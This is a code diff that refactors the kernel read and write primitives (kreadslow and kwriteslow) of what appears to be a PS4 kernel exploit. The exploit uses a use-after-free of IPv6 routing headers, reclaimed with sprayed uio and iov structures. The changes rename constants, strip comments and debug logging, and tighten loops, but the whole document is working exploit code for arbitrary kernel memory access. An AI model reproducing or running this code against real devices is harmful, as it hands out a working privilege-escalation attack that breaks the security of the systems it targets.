@@ -1670,7 +1670,28 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
   write64(uio.add(0x30), addr);             // iov_base
   write64(uio.add(0x38), size);             // iov_len
 }
-var KREAD_MAX_KQ = 10000; // بدل 10000 الهاردكود
+// =========================
+//  GLOBAL EXPLOIT CONSTANTS
+// =========================
+
+// UIO reclaim max loops
+var KREAD_MAX_UIO_RECLAIM  = 5000;
+var KWRITE_MAX_UIO_RECLAIM = 5000;
+
+// IOV reclaim max loops
+var KREAD_MAX_IOV_RECLAIM  = 3000;
+var KWRITE_MAX_IOV_RECLAIM = 3000;
+
+// Memory exhaustion threshold
+var MEMORY_ZERO_THRESHOLD = 5;
+
+// Offsets inside leak_rthdr
+var UIO_LEAK_OFFSET = 0x08;
+var IOV_LEAK_OFFSET = 0x20;
+
+// Tag used to detect valid leak
+var LEAK_TAG = new BigInt(0x41414141, 0x41414141);
+
 function kreadslow(addr, size) {
   debug('Enter kreadslow addr: ' + hex(addr) + ' size: ' + size);
 
@@ -1679,7 +1700,6 @@ function kreadslow(addr, size) {
     return BigInt_Error;
   }
 
-  // Memory exhaustion check
   if (typeof debugging !== 'undefined' &&
       debugging.info &&
       debugging.info.memory &&
@@ -1689,9 +1709,9 @@ function kreadslow(addr, size) {
     cleanup(true);
     return BigInt_Error;
   }
+
   debug('kreadslow - Preparing buffers...');
 
-  // Prepare leak buffers.
   var leak_buffers = new Array(UIO_THREAD_NUM);
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
     leak_buffers[i] = malloc(size);
@@ -1701,105 +1721,82 @@ function kreadslow(addr, size) {
     }
   }
 
-  // Set send buf size.
   write32(sockopt_val_buf, size);
   setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
 
-  // Fill queue.
   write(new BigInt(uio_sock_1), tmp, size);
 
-  // Set iov length
   write64(uioIovRead.add(0x08), size);
-  debug('kreadslow - Freeing triplets[1]=' + triplets[1]);
 
-  // Validate triplets[1]
   if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
     log('kreadslow: invalid triplets[1]');
     return BigInt_Error;
   }
 
-  // Free one.
   free_rthdr(ipv6_socks[triplets[1]]);
 
-  // Minimize footprint
-  var uio_leak_add = leak_rthdr.add(0x08);
+  var uio_leak_add = leak_rthdr.add(UIO_LEAK_OFFSET);
+
   debug('kreadslow - Starting UIO reclaim loop...');
   var count = 0;
   var zeroMemoryCount = 0;
 
-  // Reclaim with uio.
-  while (count < KREAD_MAX_KQ) {
+  while (count < KREAD_MAX_UIO_RECLAIM) {
+
     if (typeof debugging !== 'undefined' &&
         debugging.info &&
         debugging.info.memory &&
         debugging.info.memory.available === 0) {
 
       zeroMemoryCount++;
-      if (zeroMemoryCount >= 5) {
+      if (zeroMemoryCount >= MEMORY_ZERO_THRESHOLD) {
         log('kreadslow: memory exhausted during UIO reclaim — please reboot your PS4 and try again.');
         cleanup(true);
         return BigInt_Error;
       }
 
-    } else {
-      zeroMemoryCount = 0;
-    }
+    } else zeroMemoryCount = 0;
 
     count++;
-    if (count % 100 === 1) {
-      debug('kreadslow - UIO loop iter ' + count);
-    }
 
-    trigger_uio_writev(); // COMMAND_UIO_READ in fl0w's
+    trigger_uio_writev();
     sched_yield();
 
-    // Leak with other rthdr.
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
-    if (read32(uio_leak_add) === UIO_IOV_NUM) {
-      break;
-    }
+    if (read32(uio_leak_add) === UIO_IOV_NUM) break;
 
-    // Wake up all threads.
     read(new BigInt(uio_sock_0), tmp, size);
-    for (var _i12 = 0; _i12 < UIO_THREAD_NUM; _i12++) {
-      read(new BigInt(uio_sock_0), leak_buffers[_i12], size);
+    for (var j = 0; j < UIO_THREAD_NUM; j++) {
+      read(new BigInt(uio_sock_0), leak_buffers[j], size);
     }
     wait_uio_writev();
 
-    // Fill queue.
     write(new BigInt(uio_sock_1), tmp, size);
   }
 
-  if (count >= KREAD_MAX_KQ) {
+  if (count >= KREAD_MAX_UIO_RECLAIM) {
     log('kreadslow: UIO reclaim timeout — please reboot your PS4 and try again.');
     cleanup(true);
     return BigInt_Error;
   }
 
-  debug('kreadslow - UIO reclaim succeeded after ' + count + ' iterations');
   var uio_iov = read64(leak_rthdr);
-  debug('kreadslow - uio_iov: ' + hex(uio_iov));
 
-  // Prepare uio reclaim buffer.
   build_uio(msgIov, uio_iov, 0, true, addr, size);
-  debug('kreadslow - Freeing triplets[2]=' + triplets[2]);
 
-  // Validate triplets[2]
   if (triplets[2] < 0 || triplets[2] >= ipv6_socks.length) {
     log('kreadslow: invalid triplets[2]');
     return BigInt_Error;
   }
 
-  // Free second one.
   free_rthdr(ipv6_socks[triplets[2]]);
 
-  // Minimize footprint
-  var iov_leak_add = leak_rthdr.add(0x20);
-  debug('kreadslow - Starting IOV reclaim loop...');
+  var iov_leak_add = leak_rthdr.add(IOV_LEAK_OFFSET);
 
-  // Reclaim uio with iov.
+  debug('kreadslow - Starting IOV reclaim loop...');
   var zeroMemoryCount2 = 0;
   var count2 = 0;
+
   while (true) {
     count2++;
 
@@ -1809,66 +1806,45 @@ function kreadslow(addr, size) {
         debugging.info.memory.available === 0) {
 
       zeroMemoryCount2++;
-      if (zeroMemoryCount2 >= 5) {
+      if (zeroMemoryCount2 >= MEMORY_ZERO_THRESHOLD) {
         log('kreadslow: memory exhausted during IOV reclaim — please reboot your PS4 and try again.');
         cleanup(true);
         return BigInt_Error;
       }
 
-    } else {
-      zeroMemoryCount2 = 0;
-    }
+    } else zeroMemoryCount2 = 0;
 
-    if (count2 >= 5000) {
+    if (count2 >= KREAD_MAX_IOV_RECLAIM) {
       log('kreadslow: IOV reclaim timeout — please reboot your PS4 and try again.');
       cleanup(true);
       return BigInt_Error;
     }
 
-    // Reclaim with iov.
     trigger_iov_recvmsg();
     sched_yield();
 
-    // Leak with other rthdr.
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
-    if (read32(iov_leak_add) === UIO_SYSSPACE) {
-      debug('kreadslow - IOV reclaim succeeded after ' + count2 + ' iterations');
-      break;
-    }
+    if (read32(iov_leak_add) === UIO_SYSSPACE) break;
 
-    // Release iov spray.
     write(new BigInt(iov_sock_1), tmp, 1);
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
   }
 
-  debug('kreadslow - Reading leak buffers...');
-
-  // Wake up all threads.
   read(new BigInt(uio_sock_0), tmp, size);
 
-  // Read the results now.
   var leak_buffer = new BigInt(0);
-  var tag_val = new BigInt(0x41414141, 0x41414141);
 
-  // Get leak.
-  for (var _i13 = 0; _i13 < UIO_THREAD_NUM; _i13++) {
-    read(new BigInt(uio_sock_0), leak_buffers[_i13], size);
-    var val = read64(leak_buffers[_i13]);
-    debug('kreadslow - leak_buffers[' + _i13 + ']: ' + hex(val));
-    if (!val.eq(tag_val)) {
-      debug('kreadslow - Found valid leak at index ' + _i13 + ', finding triplets[1]...');
-      // Find triplet.
+  for (var k = 0; k < UIO_THREAD_NUM; k++) {
+    read(new BigInt(uio_sock_0), leak_buffers[k], size);
+    var val = read64(leak_buffers[k]);
+    if (!val.eq(LEAK_TAG)) {
       triplets[1] = find_triplet(triplets[0], -1);
-      debug('kreadslow - triplets[1]=' + triplets[1]);
-      leak_buffer = leak_buffers[_i13].add(0);
+      leak_buffer = leak_buffers[k].add(0);
     }
   }
 
-  // Workers should have finished earlier no need to wait
   wait_uio_writev();
-
-  // Release iov spray.
   write(new BigInt(iov_sock_1), tmp, 1);
 
   if (leak_buffer.eq(0)) {
@@ -1879,17 +1855,12 @@ function kreadslow(addr, size) {
     return BigInt_Error;
   }
 
-  debug('kreadslow - Finding triplets[2]...');
-
-  // Find triplet[2].
   for (var retry = 0; retry < 3; retry++) {
     triplets[2] = find_triplet(triplets[0], triplets[1]);
     if (triplets[2] !== -1) break;
-    debug('kreadslow - triplets[2] retry ' + (retry + 1));
     sched_yield();
   }
 
-  debug('kreadslow - triplets[2]=' + triplets[2]);
   if (triplets[2] === -1) {
     log('kreadslow: failed to find triplets[2] — reboot required.');
     wait_iov_recvmsg();
@@ -1898,16 +1869,14 @@ function kreadslow(addr, size) {
     return BigInt_Error;
   }
 
-  // Workers should have finished earlier no need to wait
   wait_iov_recvmsg();
   read(new BigInt(iov_sock_0), tmp, 1);
-  debug('kreadslow - Done, returning leak_buffer: ' + hex(leak_buffer));
+
   return leak_buffer;
 }
 function kwriteslow(addr, buffer, size) {
   debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size: ' + size);
 
-  // Input guards
   if (addr.eq(0) || size <= 0) {
     log('kwriteslow: invalid addr/size');
     return BigInt_Error;
@@ -1917,7 +1886,6 @@ function kwriteslow(addr, buffer, size) {
     return BigInt_Error;
   }
 
-  // Validate triplets
   if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
     log('kwriteslow: invalid triplets[1]');
     return BigInt_Error;
@@ -1927,56 +1895,47 @@ function kwriteslow(addr, buffer, size) {
     return BigInt_Error;
   }
 
-  // Set send buf size.
   write32(sockopt_val_buf, size);
   setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
 
-  // Set iov length.
   write64(uioIovWrite.add(0x08), size);
 
-  // Free first triplet.
   free_rthdr(ipv6_socks[triplets[1]]);
 
-  // Minimize footprint
-  var uio_leak_add = leak_rthdr.add(0x08);
+  var uio_leak_add = leak_rthdr.add(UIO_LEAK_OFFSET);
 
-  // Reclaim with uio.
   var zeroMemoryCount = 0;
   var count = 0;
+
   while (true) {
+
     if (typeof debugging !== 'undefined' &&
         debugging.info &&
         debugging.info.memory &&
         debugging.info.memory.available === 0) {
 
       zeroMemoryCount++;
-      if (zeroMemoryCount >= 5) {
+      if (zeroMemoryCount >= MEMORY_ZERO_THRESHOLD) {
         log('kwriteslow: memory exhausted during UIO reclaim — please reboot your PS4 and try again.');
         cleanup(true);
         return BigInt_Error;
       }
 
-    } else {
-      zeroMemoryCount = 0;
-    }
+    } else zeroMemoryCount = 0;
 
     count++;
-    if (count >= 5000) {
+    if (count >= KWRITE_MAX_UIO_RECLAIM) {
       log('kwriteslow: UIO reclaim timeout — please reboot your PS4 and try again.');
       cleanup(true);
       return BigInt_Error;
     }
 
-    trigger_uio_readv(); // COMMAND_UIO_WRITE in fl0w's
+    trigger_uio_readv();
     sched_yield();
 
-    // Leak with other rthdr.
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
-    if (read32(uio_leak_add) === UIO_IOV_NUM) {
-      break;
-    }
+    if (read32(uio_leak_add) === UIO_IOV_NUM) break;
 
-    // Wake up all threads.
     for (var i = 0; i < UIO_THREAD_NUM; i++) {
       write(new BigInt(uio_sock_1), buffer, size);
     }
@@ -1985,84 +1944,70 @@ function kwriteslow(addr, buffer, size) {
 
   var uio_iov = read64(leak_rthdr);
 
-  // Prepare uio reclaim buffer.
   build_uio(msgIov, uio_iov, 0, false, addr, size);
 
-  // Validate triplets[2] before free
   if (triplets[2] < 0 || triplets[2] >= ipv6_socks.length) {
     log('kwriteslow: invalid triplets[2] before free');
     return BigInt_Error;
   }
 
-  // Free second one.
   free_rthdr(ipv6_socks[triplets[2]]);
 
-  // Minimize footprint
-  var iov_leak_add = leak_rthdr.add(0x20);
+  var iov_leak_add = leak_rthdr.add(IOV_LEAK_OFFSET);
 
-  // Reclaim uio with iov.
   var zeroMemoryCount2 = 0;
   var count2 = 0;
+
   while (true) {
+
     if (typeof debugging !== 'undefined' &&
         debugging.info &&
         debugging.info.memory &&
         debugging.info.memory.available === 0) {
 
       zeroMemoryCount2++;
-      if (zeroMemoryCount2 >= 5) {
+      if (zeroMemoryCount2 >= MEMORY_ZERO_THRESHOLD) {
         log('kwriteslow: memory exhausted during IOV reclaim — please reboot your PS4 and try again.');
         cleanup(true);
         return BigInt_Error;
       }
 
-    } else {
-      zeroMemoryCount2 = 0;
-    }
+    } else zeroMemoryCount2 = 0;
 
     count2++;
-    if (count2 >= 5000) {
+    if (count2 >= KWRITE_MAX_IOV_RECLAIM) {
       log('kwriteslow: IOV reclaim timeout — please reboot your PS4 and try again.');
       cleanup(true);
       return BigInt_Error;
     }
 
-    // Reclaim with iov.
     trigger_iov_recvmsg();
     sched_yield();
 
-    // Leak with other rthdr.
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
-    if (read32(iov_leak_add) === UIO_SYSSPACE) {
-      break;
-    }
+    if (read32(iov_leak_add) === UIO_SYSSPACE) break;
 
-    // Release iov spray.
     write(new BigInt(iov_sock_1), tmp, 1);
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
   }
 
-  // Corrupt data.
-  for (var _i14 = 0; _i14 < UIO_THREAD_NUM; _i14++) {
+  for (var j = 0; j < UIO_THREAD_NUM; j++) {
     write(new BigInt(uio_sock_1), buffer, size);
   }
 
-  // Find triplet.
   triplets[1] = find_triplet(triplets[0], -1);
 
-  // Workers should have finished earlier no need to wait
   wait_uio_readv();
 
-  // Release iov spray.
   write(new BigInt(iov_sock_1), tmp, 1);
 
-  // Find triplet[2].
   for (var retry = 0; retry < 3; retry++) {
     triplets[2] = find_triplet(triplets[0], triplets[1]);
     if (triplets[2] !== -1) break;
     sched_yield();
   }
+
   if (triplets[2] === -1) {
     log('kwriteslow: failed to find triplets[2] — reboot required.');
     wait_iov_recvmsg();
@@ -2071,9 +2016,9 @@ function kwriteslow(addr, buffer, size) {
     return BigInt_Error;
   }
 
-  // Workers should have finished earlier no need to wait
   wait_iov_recvmsg();
   read(new BigInt(iov_sock_0), tmp, 1);
+
   return new BigInt(0);
 }
 
